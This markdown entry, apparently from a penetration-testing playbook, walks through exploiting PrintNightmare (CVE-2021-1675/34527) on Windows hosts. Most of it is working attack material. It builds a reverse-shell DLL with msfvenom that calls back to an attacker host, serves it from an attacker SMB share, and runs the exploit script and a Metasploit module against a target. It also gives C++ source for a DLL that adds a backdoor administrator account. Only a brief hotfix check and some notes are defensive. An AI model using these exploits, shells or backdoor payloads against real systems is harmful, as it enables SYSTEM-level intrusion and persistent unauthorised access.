---
id: printnightmare
title: PrintNightmare (CVE-2021-1675 / 34527)
stage: initial-access
tags: [windows]
tools:
  - impacket-rpcdump @$TARGET | grep -i print
  - python3 CVE-2021-1675.py domain/user:pass@$TARGET '\\ATTACKER\share\evil.dll'
  - msfconsole → use exploit/windows/dcerpc/cve_2021_1675_printnightmare
leads_to: [rev-shell, system-shell]
summary: Exploit Windows Print Spooler RCE to load a malicious DLL as SYSTEM — works on unpatched DCs and workstations.
---

## Check Spooler is Running

```bash
# From Linux
impacket-rpcdump @$TARGET | grep -i "print\|spooler"

# From Windows
sc query spooler
Get-Service -Name Spooler
```

## Impacket Exploit (RCE via SMB Share)

Set up a malicious DLL served from an SMB share:

```bash
# Start SMB server on attacker
impacket-smbserver share $(pwd) -smb2support

# Generate DLL reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f dll -o evil.dll

# Run exploit — drops DLL into C:\Windows\System32\spool\drivers\
python3 CVE-2021-1675.py domain.local/user:password@$TARGET '\\ATTACKER_IP\share\evil.dll'
```

## Metasploit

```bash
msfconsole -q
use exploit/windows/dcerpc/cve_2021_1675_printnightmare
set RHOSTS $TARGET
set SMBUser user
set SMBPass password
set SMBDomain domain.local
set DLL_PATH /path/to/evil.dll
run
```

## Add Local Admin (Alternative Payload)

If you already have SMB write access, inject a DLL that adds a user:

```cpp
// Minimal DLL payload (AddUser.cpp)
// Compiles to: x86_64-w64-mingw32-gcc -shared -o add_user.dll add_user.cpp
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH)
        system("net user hacker P@ssw0rd! /add && net localgroup Administrators hacker /add");
    return TRUE;
}
```

## Detect Vulnerable Hosts

```powershell
# PowerShell — check if patch KB5004945/KB5004946 is missing
Get-HotFix | Where-Object {$_.HotFixID -in @('KB5004945','KB5004946','KB5004947')}
# If nothing returned for this month's rollup — likely unpatched
```

## Notes

- CVE-2021-1675 = local privilege escalation; CVE-2021-34527 = remote RCE — the impacket PoC covers both
- The Print Spooler runs as SYSTEM — the loaded DLL gets SYSTEM immediately
- Domain Controllers often have Print Spooler enabled (required for some legacy AD features) — this is why it's critical
- Patch: KB5004945 (July 2021 OOB) — many systems still unpatched in lab environments
- If spooler is disabled but you have local admin, you can enable it: `sc start spooler`

